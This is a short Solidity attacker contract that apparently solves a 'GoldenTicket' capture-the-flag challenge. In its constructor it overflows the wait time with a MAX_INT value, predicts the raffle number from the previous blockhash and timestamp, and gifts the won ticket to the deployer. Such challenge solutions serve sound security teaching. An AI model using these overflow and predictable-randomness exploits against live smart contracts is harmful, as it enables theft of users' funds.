// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

import "../ChallengeGoldenTicket.sol";

contract ChallengeGoldenTicketAttacker {
    constructor(address target) {
        uint256 MAX_INT = 2**256 - 1;
        uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));

        GoldenTicket challenge = GoldenTicket(target);
        challenge.joinWaitlist();
        challenge.updateWaitTime(MAX_INT - block.timestamp);
        challenge.joinRaffle(randomNumber);
        challenge.giftTicket(msg.sender);
    }
}
